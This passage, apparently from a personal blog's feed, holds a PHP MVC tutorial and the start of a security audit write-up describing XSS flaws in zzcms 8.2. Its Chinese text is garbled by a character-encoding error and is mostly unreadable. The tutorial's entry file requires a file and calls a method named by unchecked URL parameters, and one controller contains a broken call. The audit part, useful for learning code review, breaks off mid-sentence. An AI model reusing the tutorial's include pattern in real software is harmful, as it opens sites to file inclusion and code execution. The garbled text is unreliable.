·çš„æ„ä»¶å¯¹è±¡æ¥å¤„ç†æ•°æ®åº“ã€‚è¢«æ¨¡å‹è¿”å›çš„æ•°æ®æ˜¯ä¸­ç«‹çš„ï¼Œå°±æ˜¯è¯´æ¨¡å‹ä¸æ•°æ®æ ¼å¼æ— å…³ï¼Œè¿™æ ·ä¸€ä¸ªæ¨¡å‹èƒ½ä¸ºå¤šä¸ªè§†å›¾æä¾›æ•°æ®ã€‚ç”±äºåº”ç”¨äºæ¨¡å‹çš„ä»£ç åªéœ€å†™ä¸€æ¬¡å°±å¯ä»¥è¢«å¤šä¸ªè§†å›¾é‡ç”¨ï¼Œæ‰€ä»¥å‡å°‘äº†ä»£ç çš„é‡å¤æ€§ã€‚</p><p>æ§åˆ¶å™¨ï¼šæ§åˆ¶å™¨æ¥å—ç”¨æˆ·çš„è¾“å…¥å¹¶è°ƒç”¨æ¨¡å‹å’Œè§†å›¾å»å®Œæˆç”¨æˆ·çš„éœ€æ±‚ã€‚æ‰€ä»¥å½“å•å‡»Webé¡µé¢ä¸­çš„è¶…é“¾æ¥å’Œå‘é€HTMLè¡¨å•æ—¶ï¼Œæ§åˆ¶å™¨æœ¬èº«ä¸è¾“å‡ºä»»ä½•ä¸œè¥¿å’Œåšä»»ä½•å¤„ç†ã€‚å®ƒåªæ˜¯æ¥æ”¶è¯·æ±‚å¹¶å†³å®šè°ƒç”¨å“ªä¸ªæ¨¡å‹æ„ä»¶å»å¤„ç†è¯·æ±‚ï¼Œç„¶åç¡®å®šç”¨å“ªä¸ªè§†å›¾æ¥æ˜¾ç¤ºæ¨¡å‹å¤„ç†è¿”å›çš„æ•°æ®ã€‚</p><h1 id="å•ä¸€å…¥å£"><a href="#å•ä¸€å…¥å£" class="headerlink" title="å•ä¸€å…¥å£"></a>å•ä¸€å…¥å£</h1><p>å•ä¸€å…¥å£é€šå¸¸æ˜¯æŒ‡ä¸€ä¸ªé¡¹ç›®æˆ–è€…åº”ç”¨å…·æœ‰ä¸€ä¸ªç»Ÿä¸€ï¼ˆä½†å¹¶ä¸ä¸€å®šæ˜¯å”¯ä¸€ï¼‰çš„å…¥å£æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯è¯´é¡¹ç›®çš„æ‰€æœ‰åŠŸèƒ½æ“ä½œéƒ½æ˜¯é€šè¿‡è¿™ä¸ªå…¥å£æ–‡ä»¶è¿›è¡Œçš„ï¼Œå¹¶ä¸”å¾€å¾€å…¥å£æ–‡ä»¶æ˜¯ç¬¬ä¸€æ­¥è¢«æ‰§è¡Œçš„ã€‚</p><p>å•ä¸€å…¥å£çš„å¥½å¤„æ˜¯é¡¹ç›®æ•´ä½“æ¯”è¾ƒè§„èŒƒï¼Œå› ä¸ºåŒä¸€ä¸ªå…¥å£ï¼Œå¾€å¾€å…¶ä¸åŒæ“ä½œä¹‹é—´å…·æœ‰ç›¸åŒçš„è§„åˆ™ã€‚å¦å¤–ä¸€ä¸ªæ–¹é¢å°±æ˜¯å•ä¸€å…¥å£å¸¦æ¥çš„å¥½å¤„æ˜¯æ§åˆ¶è¾ƒä¸ºçµæ´»ï¼Œå› ä¸ºæ‹¦æˆªæ–¹ä¾¿äº†ï¼Œç±»ä¼¼å¦‚ä¸€äº›æƒé™æ§åˆ¶ã€ç”¨æˆ·ç™»å½•æ–¹é¢çš„åˆ¤æ–­å’Œæ“ä½œå¯ä»¥ç»Ÿä¸€å¤„ç†äº†ã€‚</p><p>æˆ–è€…æœ‰äº›äººä¼šæ‹…å¿ƒæ‰€æœ‰ç½‘ç«™éƒ½é€šè¿‡ä¸€ä¸ªå…¥å£æ–‡ä»¶è¿›è¡Œè®¿é—®ï¼Œæ˜¯å¦ä¼šé€ æˆå¤ªå¤§çš„å‹åŠ›ï¼Œå…¶å®è¿™æ˜¯æäººå¿§å¤©çš„æƒ³æ³•ã€‚</p><p>ç°åœ¨æˆ‘ä»¬æ€»ç»“MVCçš„å¤„ç†è¿‡ç¨‹ï¼Œé¦–å…ˆæ§åˆ¶å™¨æ¥æ”¶ç”¨æˆ·çš„è¯·æ±‚ï¼Œå¹¶å†³å®šåº”è¯¥è°ƒç”¨å“ªä¸ªæ¨¡å‹æ¥è¿›è¡Œå¤„ç†ï¼Œç„¶åæ¨¡å‹ç”¨ä¸šåŠ¡é€»è¾‘æ¥å¤„ç†ç”¨æˆ·çš„è¯·æ±‚å¹¶è¿”å›æ•°æ®ï¼Œæœ€åæ§åˆ¶å™¨ç”¨ç›¸åº”çš„è§†å›¾æ ¼å¼åŒ–æ¨¡å‹è¿”å›çš„æ•°æ®ï¼Œå¹¶é€šè¿‡è¡¨ç¤ºå±‚å‘ˆç°ç»™ç”¨æˆ·ã€‚</p><p>ä¸€ä¸ªå…¸å‹çš„Web MVCæµç¨‹ï¼š</p><p>Controlleræˆªè·ç”¨æˆ·å‘å‡ºçš„è¯·æ±‚ï¼›<br>Controllerè°ƒç”¨Modelå®ŒæˆçŠ¶æ€çš„è¯»å†™æ“ä½œï¼›<br>ControlleræŠŠæ•°æ®ä¼ é€’ç»™Viewï¼›<br>Viewæ¸²æŸ“æœ€ç»ˆç»“æœå¹¶å‘ˆçŒ®ç»™ç”¨æˆ·ã€‚</p><h1 id="ä»£ç è§„èŒƒ"><a href="#ä»£ç è§„èŒƒ" class="headerlink" title="ä»£ç è§„èŒƒ"></a>ä»£ç è§„èŒƒ</h1><p>MySQLçš„è¡¨åéœ€å°å†™æˆ–å°å†™åŠ ä¸‹åˆ’çº¿ï¼Œå¦‚ï¼šitemï¼Œcar_ordersã€‚<br>æ¨¡å—åï¼ˆModelsï¼‰éœ€ç”¨å¤§é©¼å³°å‘½åæ³•ï¼Œå³é¦–å­—æ¯å¤§å†™ï¼Œå¹¶åœ¨åç§°åæ·»åŠ Modelï¼Œå¦‚ï¼šItemModelï¼ŒCarModelã€‚<br>æ§åˆ¶å™¨ï¼ˆControllersï¼‰éœ€ç”¨å¤§é©¼å³°å‘½åæ³•ï¼Œå³é¦–å­—æ¯å¤§å†™ï¼Œå¹¶åœ¨åç§°åæ·»åŠ Controllerï¼Œå¦‚ï¼šItemControllerï¼ŒCarControllerã€‚<br>æ–¹æ³•åï¼ˆActionï¼‰éœ€ç”¨å°é©¼å³°å‘½åæ³•ï¼Œå³é¦–å­—æ¯å°å†™ï¼Œå¦‚ï¼šindexï¼ŒindexPostã€‚<br>è§†å›¾ï¼ˆViewsï¼‰éƒ¨ç½²ç»“æ„ä¸ºæ§åˆ¶å™¨å/è¡Œä¸ºåï¼Œå¦‚ï¼šitem/view.phpï¼Œcar/buy.phpã€‚</p><p>å¯¹äºåªæœ‰ PHP ä»£ç çš„æ–‡ä»¶ï¼Œæœ€å¥½æ²¡æœ‰ç»“æŸæ ‡å¿—?&gt;ï¼Œ<br>PHPè‡ªèº«å¹¶ä¸éœ€è¦ç»“æŸç¬¦å·ï¼Œä¸åŠ ç»“æŸç¬¦è®©ç¨‹åºæ›´åŠ å®‰å…¨ï¼Œå¾ˆå¤§ç¨‹åº¦é˜²æ­¢äº†æœ«å°¾è¢«æ³¨å…¥é¢å¤–çš„å†…å®¹ã€‚</p><p>è¯·æ±‚URL<br>ocalhost/index.php?c=demo&amp;a=indexÂ¶m=welcome</p><p>å¦‚æœæƒ³å¾—åˆ°æ›´åŠ ä¼˜ç¾çš„URLç»“æ„ï¼Œå¯ä»¥è¿›è¡Œä¼˜åŒ–ï¼Œä¸ºç”±è¿™URLç»“æ„ä¼˜åŒ–ä¸æœ¬æ–‡å…³ç³»ä¸å¤§ï¼Œä»¥åè¿›è¡Œåˆ†äº«ã€‚</p><p>ä»ä¸Šé¢çš„å‚æ•°å¯ä»¥çœ‹å‡ºï¼Œè®¿é—®çš„æ–‡ä»¶æ˜¯index.phpï¼ŒåŒæ—¶å«æœ‰3ä¸ªå‚æ•°åˆ†åˆ«ä¸ºcã€aã€paramã€‚</p><h1 id="MVCå®ç°"><a href="#MVCå®ç°" class="headerlink" title="MVCå®ç°"></a>MVCå®ç°</h1><p>é¦–å…ˆæ¥å®ç°ä¸€ä¸ªç®€å•çš„MVC<br><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">â”œâ”€www                       <span class="meta"># ç½‘ç«™æ ¹ç›®å½•</span></span><br><span class="line">â”‚  â”œâ”€controller             <span class="meta"># æ§åˆ¶å™¨ç›®å½•</span></span><br><span class="line">â”‚  â”‚  â”œâ”€democontroller.php  <span class="meta"># demoæ§åˆ¶å™¨</span></span><br><span class="line">â”‚  â”œâ”€model                  <span class="meta"># æ¨¡å‹ç›®å½•</span></span><br><span class="line">â”‚  â”‚  â”œâ”€model.php           <span class="meta"># modelæ¨¡å‹</span></span><br><span class="line">â”‚  â”œâ”€view                   <span class="meta"># è§†å›¾ç›®å½•</span></span><br><span class="line">â”‚  â”‚  â”œâ”€<span class="keyword">index</span>.php           <span class="meta"># indexè§†å›¾</span></span><br><span class="line">â”‚  â”œâ”€<span class="keyword">index</span>.php              <span class="meta"># å…¥å£æ–‡ä»¶</span></span><br></pre></td></tr></table></figure></p><p>/index.php<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">require</span>(<span class="string">'controller/democontroller.php'</span>);</span></span><br><span class="line"><span class="php">$controller = <span class="keyword">new</span> DemoController();</span></span><br><span class="line"><span class="php">$controller-&gt;index();</span></span><br></pre></td></tr></table></figure></p><p>controller/democontroller.php<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">DemoController</span></span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"hello world"</span>;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure></p><p>è®¿é—®127.0.0.1/index.php<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1ablxog3cj30au03emx5.jpg" alt=""><br>å¦‚æœä½¿ç”¨ä¸‹é¢çš„URLè¿›è¡Œè®¿é—®ï¼Œå¯ä»¥é¢„è§ä¸ä¼šæœ‰ä»»ä½•è¾“å‡ºã€‚<br>è®¿é—®<a href="http://localhost/controller/democontroller.php" target="_blank" rel="noopener">http://localhost/controller/democontroller.php</a><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1abmuc7nfj30dp064wek.jpg" alt=""><br>åªèƒ½é€šè¿‡index.phpæ¥è®¿é—®ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆç§°å®ƒä¸ºå…¥å£æ–‡ä»¶çš„åŸå› <br>ç°åœ¨æ¥é€šè¿‡å‚æ•°æ¥è°ƒç”¨ä¸åŒçš„æ§åˆ¶å™¨<br>æ¥ä¸‹æ¥æ”¹å†™index.phpå†…å®¹<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> $c_str = $_GET[<span class="string">'c'</span>];  <span class="comment">// è·å–æ§åˆ¶å™¨</span></span></span><br><span class="line"><span class="php"> $c_name = $c_str.<span class="string">'controller'</span>;</span></span><br><span class="line"><span class="php"> $c_path = <span class="string">'controller/'</span>.$c_name.<span class="string">'.php'</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> $method = $_GET[<span class="string">'a'</span>]; <span class="comment">//æ–¹æ³•å</span></span></span><br><span class="line"><span class="php"> <span class="keyword">require</span>($c_path);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> $controller = <span class="keyword">new</span> $c_name;</span></span><br><span class="line"><span class="php"> $controller-&gt;$method();</span></span><br></pre></td></tr></table></figure></p><p>è®¿é—®<br><a href="http://localhost/index.php?c=demo&amp;a=index" target="_blank" rel="noopener">http://localhost/index.php?c=demo&amp;a=index</a><br>åŒæ ·èƒ½å¤Ÿå¾—åˆ°å†…å®¹</p><p>æ¥ä¸‹æ¥åŠ å…¥view,ä½¿ç”¨è§†å›¾å¯¹è±¡å¤„ç†è¾“å‡º<br>view/index.php<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> <span class="class"><span class="keyword">class</span> <span class="title">Index</span> </span>&#123;</span></span><br><span class="line"><span class="php">     <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">($output)</span> </span>&#123;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">         <span class="keyword">echo</span> $output;</span></span><br><span class="line"><span class="php">     &#125;</span></span><br><span class="line"><span class="php"> &#125;</span></span><br></pre></td></tr></table></figure></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="comment">// controller/democontroller.php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">DemoController</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">    $data = <span class="string">'Hello furzoom!'</span>;</span></span><br><span class="line"><span class="php">    <span class="comment">//echo 'hello world';</span></span></span><br><span class="line"><span class="php">    <span class="keyword">require</span>(<span class="string">'view/index.php'</span>);</span></span><br><span class="line"><span class="php">    $view = <span class="keyword">new</span> Index();</span></span><br><span class="line"><span class="php">    $view-&gt;display($data);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><p> è®¿é—® <a href="http://localhost/index.php?c=demo&amp;a=index" target="_blank" rel="noopener">http://localhost/index.php?c=demo&amp;a=index</a><br> <img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1acj5f1k6j30bn02zdfv.jpg" alt=""></p><p> ä¸Šé¢è²Œä¼¼å·²ç»å¾ˆcooläº†ï¼Œä½†æ˜¯æ˜¾ç¤ºä»€ä¹ˆæ ·çš„å†…å®¹æ˜¯åœ¨æ§åˆ¶å™¨ä¸­ç›´æ¥æŒ‡å®šçš„ï¼Œå¸Œæœ›å†…å®¹ä¹Ÿç”±URLæŒ‡å®šï¼Œè¿™æ ·å°†æ•°æ®çš„å¤„ç†äº¤ç»™æ¨¡å‹æ¥å¤„ç†ã€‚<br>model/model.php<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">// model/model.php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">private</span> $data = <span class="keyword">array</span>(</span></span><br><span class="line"><span class="php">    <span class="string">'title'</span> =&gt; <span class="string">'Hello style'</span>,</span></span><br><span class="line"><span class="php">    <span class="string">'key'</span> =&gt; <span class="string">'welcome to style-404.github.io'</span>,</span></span><br><span class="line"><span class="php">  );</span></span><br><span class="line"><span class="php">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span><span class="params">($key)</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> <span class="keyword">$this</span> -&gt;data[$key];</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure></p><p>è§†å›¾æ–‡ä»¶model.phpå®šä¹‰äº†ä¸€ä¸ªModelç±»ï¼Œç±»ä¸­å®šä¹‰äº†ä¸€ä¸ªgetData()çš„æ–¹æ³•ï¼Œç”¨äºè¿”å›è¯·æ±‚çš„æ•°æ®ã€‚</p><p>åŒæ—¶ä¿®æ”¹å…¥å£æ–‡ä»¶index.phpå¦‚ä¸‹ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> $c_str = $_GET[<span class="string">'c'</span>];  <span class="comment">// è·å–æ§åˆ¶å™¨</span></span></span><br><span class="line"><span class="php"> $c_name = $c_str.<span class="string">'controller'</span>;</span></span><br><span class="line"><span class="php"> $c_path = <span class="string">'controller/'</span>.$c_name.<span class="string">'.php'</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> $method = $_GET[<span class="string">'a'</span>]; <span class="comment">//æ–¹æ³•å</span></span></span><br><span class="line"><span class="php"> <span class="keyword">require</span>($c_path);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$param = $_GET[<span class="string">'param'</span>]; <span class="comment">// å¢åŠ å‚æ•°</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> $controller = <span class="keyword">new</span> $c_name;</span></span><br><span class="line"><span class="php"> $controller-&gt;$method($param);</span></span><br></pre></td></tr></table></figure><p>å¢åŠ äº†ä¸€ä¸ªå‚æ•°$paramï¼Œå°†å…¶ä½œä¸ºæ§åˆ¶å™¨çš„æ–¹æ³•è°ƒç”¨å‚æ•°ã€‚</p><p>è¿˜éœ€è¦ä¿®æ”¹æ§åˆ¶å™¨çš„æ–¹æ³•æ ¹æ®ä¸åŒå‚æ•°å–å¾—ä¸åŒçš„æ•°æ®ã€‚<br>// controller/democontroller.php<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="comment">// controller/democontroller.php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">DemoController</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">($param)</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">    <span class="comment">// echo 'hello world';</span></span></span><br><span class="line"><span class="php">    <span class="keyword">require</span>(<span class="string">'view/index.php'</span>);</span></span><br><span class="line"><span class="php">    <span class="keyword">require</span>(<span class="string">'model/model.php'</span>);</span></span><br><span class="line"><span class="php">    $model = <span class="keyword">new</span> Model();</span></span><br><span class="line"><span class="php">    $view = <span class="keyword">new</span> Index();</span></span><br><span class="line"><span class="php">    $data = $model-&gt;getData(<span class="keyword">$this</span>-&gt;$param);</span></span><br><span class="line"><span class="php">    $view-&gt;display($data);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure></p><p>è®¿é—®<br><a href="http://localhost/index.php?c=demo&amp;a=index&amp;param=key" target="_blank" rel="noopener">http://localhost/index.php?c=demo&amp;a=index&amp;param=key</a><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1adw90p2nj30ex03ndfz.jpg" alt=""><br>æˆåŠŸ~</p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://www.awaimai.com/128.html" target="_blank" rel="noopener">https://www.awaimai.com/128.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> å¼€å‘ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>zzcmså„ç‰ˆæœ¬å®¡è®¡ä¹‹è·¯</title>
      <link href="/2019/03/17/zzcms%E5%90%84%E7%89%88%E6%9C%AC%E5%AE%A1%E8%AE%A1%E4%B9%8B%E8%B7%AF/"/>
      <url>/2019/03/17/zzcms%E5%90%84%E7%89%88%E6%9C%AC%E5%AE%A1%E8%AE%A1%E4%B9%8B%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"></p><h1 id="ZZCMSåŸºç¡€"><a href="#ZZCMSåŸºç¡€" class="headerlink" title="ZZCMSåŸºç¡€"></a>ZZCMSåŸºç¡€</h1><p>æ ¸å¿ƒæ–‡ä»¶ï¼š<br>inc/fuction.php  å…¨å±€å‡½æ•°æ–‡ä»¶<br>inc/config.php  å¸¸é‡é…ç½®æ–‡ä»¶<br>inc/conn.php    æ•°æ®åº“è¿æ¥é…ç½®æ–‡ä»¶,å…¶ä¸­è¿˜åŒ…å«äº†funcion.phpåŠŸèƒ½å‡½æ•°åŠstopsqlin.php è¿‡æ»¤sqlè¯­å¥ å¯¹æ‰€æœ‰get post ç­‰æ”¶åˆ°çš„æ•°æ®è¿›è¡Œæ¶ˆæ¯’</p><p>åœ¨zzzmsä¸­çš„phpæ–‡ä»¶ä¸­å‡ ä¹éƒ½ä¼šåŒ…å«conn.php check.php,check.php æ˜¯åˆ¤æ–­ç”¨æˆ·æ˜¯å¦ç™»å…¥</p><p>adv.php è®¾ç½®å’Œä¿®æ”¹å¹¿å‘Šè¯ åŒ…æ‹¬å¯¹å›¾ç‰‡çš„ä¿®æ”¹ä¸ä¸Šä¼ <br>adv2.phpæŠ¢å å¹¿å‘Šä½<br>zhadd.php  å‘å±•ä¼š äº¤ç»™zhsave.php å¤„ç†<br>msg_manage.php ç®¡ç†ç¾¤å‘<br>msg.php è¿›è¡Œç¾¤å‘</p><p>ZZCMSçš„æ•°æ®åº“<br>zzcms_ad  å­˜å‚¨ æŠ¢å å¹¿å‘Šä½çš„ ä¿¡æ¯<br>zzcms_zh å­˜å‚¨å±•ä¼šæ‰€å±çš„ç”¨æˆ·çš„æœ‰å…³ä¿¡æ¯<br>zzcms_zhclass å­˜å‚¨å±•ä¼šçš„ç±»åˆ«<br>zzcms_pp å­˜å‚¨ å‘å¸ƒçš„å“ç‰Œ åŠä¸Šä¼ çš„å›¾ç‰‡çš„åœ°å€<br>zzcms_main  å‚¨å­˜æ‹›å•†ä¿¡æ¯</p><h1 id="zzcms-8-2"><a href="#zzcms-8-2" class="headerlink" title="zzcms 8.2"></a>zzcms 8.2</h1><hr><p>å‰è¨€:<br>ZZCMS 8.2å¯ä»¥è¯´æ˜¯å­¦ä¹ ä»£ç å®¡è®¡çš„ä¸€ä¸ªç»ƒæ‰‹cmsäº† æ•´ä¸ªcmsè¯»é€šä¸éœ€è¦èŠ±å¤ªå¤šæ—¶é—´ è€Œä¸”æœ¬èº«ä¹ŸåŒ…å«äº†å¾ˆå¤šæ¼æ´ XXS sqlæ³¨å…¥ ä»»æ„æ–‡ä»¶åˆ é™¤ç­‰ç­‰<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0sbj8dkcbj30wx0jbwho.jpg" alt=""></p><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p><strong>æ¼æ´æ–‡ä»¶:</strong> /install/step_6.php</p><p><strong>æ¼æ´åŸå› :</strong>  æ²¡æœ‰è¿›è¡Œå®‰å…¨è¿‡æ»¤</p><p><strong>æ¼æ´åˆ†æ:</strong><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0td1upkijj30jy04x74l.jpg" alt=""></p><p>åœ¨step6è¿™é‡Œ,ä¼šè¾“å‡º$admin $adminpwdtrue è¿™ä¸¤ä¸ªå˜é‡çš„å€¼<br>ç„¶ååœ¨install/index.php,æŠŠæ•°ç»„ä¸­çš„é”®åç›´æ¥æ³¨å†Œä¸ºäº†å˜é‡<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0td4pajtsj30ig05mt97.jpg" alt=""><br>é€šä¿—æ¥è®²å°±æ˜¯å¦‚æœPOSTä¸€ä¸ªadmin = 1  å°±ä¼šæŠŠadmin æ³¨å†Œä¸ºå˜é‡ä½¿ç”¨ ä¸”å€¼ä¸º1<br>æ¥ç€å¾€ä¸‹çœ‹ åœ¨switchè¯­å¥ä¸­ å¦‚æœåˆ°äº†æ­¥éª¤case 6 å°±ä¼šåŒ…å«step_6.php<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0td9hsy62j30fk02cq2u.jpg" alt=""><br>åœ¨å®‰è£…cmsæ—¶åªæ˜¯ä¾æ¬¡åˆ¤æ–­,æ¥ç€è¿›è¡Œç›¸åº”çš„åŒ…å«,åœ¨æ•°æ®çš„ä¼ é€’ä¸­æ²¡æœ‰è¿›è¡Œå®‰å…¨å¤„ç†<br><strong>æ¼æ´å¤ç°:</strong><br>åœ¨/index.phpä¸­postç›¸åº”çš„stepçš„å€¼ä¼šè¿›è¡Œç›¸åº”çš„æ–‡ä»¶åŒ…å«<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0tdilpjm2j30yu0fqq5h.jpg" alt=""><br>æˆåŠŸè§¦å‘XSS</p><p><strong>æ¼æ´æ–‡ä»¶:</strong> /zx/show.php</p><p><strong>æ¼æ´åŸå› :</strong>  ç›´æ¥æ‹¼æ¥,æ²¡æœ‰ç”¨å¼•å·åŒ…è£¹</p><p><strong>æ¼æ´åˆ†æ:</strong><br>zxç›®å½•æ˜¯èµ„è®¯é¡µé¢ show.php çš„åŠŸèƒ½æ˜¯æ˜¾ç¤ºå‘å¸ƒçš„èµ„è®¯æ–‡ç« åŠå¯¹æ­¤æ–‡ç« è¿›è¡Œè¯„è®º<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0psobmnzrj30oo0ajaaz.jpg" alt=""><br>åœ¨23è¡Œèµ· å…ˆåˆ¤æ–­è¦å–å¾—æ–‡ç« id ç„¶åä»æ•°æ®åº“å–å‡º æ˜¾ç¤ºå‡ºæ¥ å…¶ä¸­ coutent è¢«å–å‡ºæ¥ç„¶ååŠ å…¥stripfxg()å¤„ç†<br>è·Ÿè¿›stripfxg() åœ¨/inc/stopsqlin.php å…¶åŠŸèƒ½æ˜¯è¿˜åŸè¢«å®ä½“åŒ–çš„æ•°æ®<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0tdos0hwij30sz03b74o.jpg" alt=""></p><p>ç»§ç»­ç”¨Seayå®¡è®¡ç³»ç»Ÿåœ¨show.phpå¯¹countent è¿›è¡Œè¿½è¸ª å‘ç°è°ƒç”¨showcontentå’ŒPayjfç­‰æ–¹æ³•,è¾“å‡ºåˆ°é¡µé¢ä¸Šï¼Œä½†æ˜¯è¿™äº›æ–¹æ³•æ²¡æœ‰å¯¹ä¸€äº›å±é™©å­—ç¬¦è¿›è¡Œå®‰å…¨å¤„ç†<br>è¿™å°±é€ 